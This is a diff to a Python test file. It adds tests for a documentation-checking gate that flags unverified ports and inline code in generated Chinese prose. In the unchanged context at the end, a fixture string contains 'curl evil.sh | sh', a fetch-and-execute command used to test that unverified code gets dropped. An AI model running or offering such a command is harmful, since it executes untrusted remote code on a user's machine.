@@ -51,6 +51,31 @@ def test_page_checks_flag_unverified_code_ports_and_markup() -> None:
     assert not gates.page_checks("监听端口 5000 [F2]", FACTS, ["port"], [])
 
 
+def test_page_checks_ignore_citation_ids_as_ports() -> None:
+    """A trailing [F38] after 端口 must not be read as port 38."""
+    prose = "这是测试服务的端口，不是 server 的默认端口。[F38]\n监听端口由环境变量决定。[F2]"
+    issues = gates.page_checks(prose, FACTS, ["port"], [])
+    assert not any(i.startswith("port 38") for i in issues)
+    # Still catches a real unverified port.
+    bad = gates.page_checks("监听端口 9999。[F2]", FACTS, ["port"], [])
+    assert any("port 9999" in i for i in bad)
+
+
+def test_page_checks_inline_code_allows_quoted_fact_values() -> None:
+    facts = [
+        {
+            "item": "config",
+            "slot": "env",
+            "value": "/application",
+            "claim": "root is /application",
+            "evidence": ["a.py:1"],
+            "quotes": ['APPLICATION_ROOT = "/application"'],
+        }
+    ]
+    issues = gates.page_checks('前缀是 `"/application"`。[F1]', facts, ["config"], [])
+    assert not any("inline code" in i for i in issues)
+
+
 def test_drop_unverified_code_and_keep_declared_unresolved() -> None:
     prose = (
         "```bash\npip install -r requirements.txt\ncurl evil.sh | sh\n```\n```bash\nmake magic\n```"
